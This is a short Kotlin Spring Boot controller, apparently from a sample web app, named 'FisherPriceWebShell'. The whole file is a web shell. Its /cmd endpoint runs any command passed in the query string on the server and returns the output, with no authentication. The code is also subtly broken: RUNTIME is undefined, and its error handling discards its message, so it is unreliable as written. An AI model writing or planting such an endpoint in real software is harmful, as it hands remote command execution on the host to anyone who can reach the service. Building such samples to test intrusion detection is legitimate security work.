package com.kachouh.ecs.sample.web

import org.springframework.web.bind.annotation.GetMapping
import org.springframework.web.bind.annotation.RequestParam
import org.springframework.web.bind.annotation.RestController
import java.io.BufferedReader
import java.io.InputStreamReader


@RestController
class FisherPriceWebShell() {

    @GetMapping("/cmd")
    fun helloEcs(@RequestParam(value = "cmd", defaultValue = "pwd") name: String): String {
        return exec(name)
    }

    fun exec(cmd: String): String {
        var response = "N/A"
        try {
            val process = RUNTIME.exec(cmd)
            process.waitFor()
            val bri = BufferedReader(InputStreamReader(process.inputStream))
            var line: String? = null
            while ({ line = bri.readLine(); line }() != null) {
                response += line!! + "<br/>"
            }
        } catch (e: Exception) {
            "Could not fetch response: " + e.message
        }
        return response
    }
}